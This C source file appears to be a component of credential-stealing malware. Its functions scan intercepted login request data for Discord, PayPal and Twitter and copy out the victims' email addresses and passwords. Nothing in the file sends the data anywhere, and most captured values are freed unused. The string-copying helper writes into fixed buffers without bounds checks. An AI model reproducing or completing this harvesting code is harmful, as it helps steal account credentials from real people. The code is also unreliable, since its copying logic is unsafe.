#include "utils.h"

char* TwitterMail;

char* FindStringOffset(char* text, const char* str, int size) {
	char* save = text;
	while (text < (save + size)) {

		if (((save + size) - text) < strlen(str))break;
		if (!strncmp(text, str, strlen(str))) {

			return text;
		}

		text++;
	}
	return NULL;
}

void GetDiscordInfo(char* info, int infoSize) {

	if (info) {
		char* email = (char*)malloc(250);
		char* password = (char*)malloc(250);
		char* pointer = FindStringOffset((char*)info, "\"login\":", infoSize);
		while (pointer && pointer < info + infoSize) {
			GetInfo(pointer + 9, email, "\"");
			pointer = FindStringOffset(pointer, "\"password\":", (info + infoSize) - pointer);

			if (pointer != NULL) {

				GetInfo(pointer + 12, password, "\"");
				break;
			}
			pointer = NULL;

		}
		free(email);
		free(password);

	}
}
void GetPaypalInfo(char* info, int infoSize) {



	if (info) {
		char* email = (char*)malloc(250);
		char* password = (char*)malloc(250);
		char* pointer = FindStringOffset((char*)info, "&login_email=", infoSize);
		while (pointer && pointer < info + infoSize) {
			GetInfo(pointer + 13, email, "&");
			pointer = FindStringOffset(pointer, "&login_password=", (info + infoSize) - pointer);

			if (pointer != NULL) {

				if (strncmp((pointer + 16), "&", 1)) {
					GetInfo(pointer + 16, password, "&");
					break;
				}

			}
			pointer = NULL;

		}
		free(email);
		free(password);

	}




}
void GetTwitterInfo(char* info, int infoSize) {
	if (info) {

		if (TwitterMail == NULL)TwitterMail = (char*)malloc(250);
		char* password = (char*)malloc(250);
		char* pointer = FindStringOffset((char*)info, "\"result\":\"", infoSize);

		if (pointer) {
			GetInfo(pointer + 10, TwitterMail, "\"");

		}
		if (strlen(TwitterMail) > 0) {

			pointer = FindStringOffset(info, "{\"password\":\"", (info + infoSize) - info);

			if (pointer) {
				GetInfo(pointer + 13, password, "\"");

			}
		}

		free(password);
		password = NULL;


	}


}
void GetInfo(char* txt, char* info, const char* stop) {

	int i = 0;
	char* save = txt;
	while (1) {

		if (!strncmp(txt, stop, 1) || txt == (save + strlen(txt))) {
			break;
		}
		memcpy(info + i, txt, 1);
		txt++;
		i++;
	}

	*(info + i) = '\0';

}



